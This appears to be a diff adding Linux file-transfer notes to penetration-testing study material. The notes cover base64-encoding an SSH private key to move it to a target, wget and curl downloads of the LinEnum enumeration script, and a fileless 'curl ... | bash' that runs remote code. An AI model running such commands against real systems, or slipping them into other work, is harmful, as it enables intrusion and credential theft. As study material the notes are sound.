@@ -259,3 +259,47 @@ ftp> USER anonymous
 ftp> PUT c:\windows\system32\drivers\etc\hosts
 ftp> bye
 ```
+# Linux Transfer Methods
+Linux offers various tools for file transfers, which are crucial for both attackers and defenders. During an incident response, we found threat actors exploiting a SQL Injection vulnerability on web servers. They used a Bash script to download malware via three methods: cURL, wget, and Python, all using HTTP. While Linux supports FTP and SMB, most malware uses HTTP/HTTPS. Understanding these methods helps in both attacking and defending networks. This section covers file transfer methods in Linux, including HTTP, Bash, and SSH.
+## Download Operations
+### Base64 Encoding / Decoding
+
+__Check file MD5 hash__
+```
+md5sum id_rsa
+```
+cat to print the file content, and base64 encode the output using a pipe |. We used the option -w 0 to create only one line. echo keyword to start a new line and make it easier to copy.
+
+__Encode SSH key to Base64__
+```
+cat id_rsa |base64 -w 0;echo
+```
+copy this base64 paste it into the target and decode it and pipe it into a file
+```
+echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNH' | base64 -d > id_rsa
+```
+compare the files hashes to see if the transfer were correct
+```
+md5sum id_rsa
+```
+### Web Downloads with Wget and cURL
+
+Wget and cURL are utilities to interact with web applications and is installed on so many linux distros
+
+__Download file using wget__
+```
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh # -O set output filename
+```
+__Download a File Using cURL__
+```
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh # -o output file
+```
+### Fileless Attacks Using Linux
+
+Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.
+![image](https://github.com/user-attachments/assets/5867d7ef-f889-4614-bbf2-9c4fc7a6516e)
+
+__Fileless Download with cURL__
+```
+ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+```
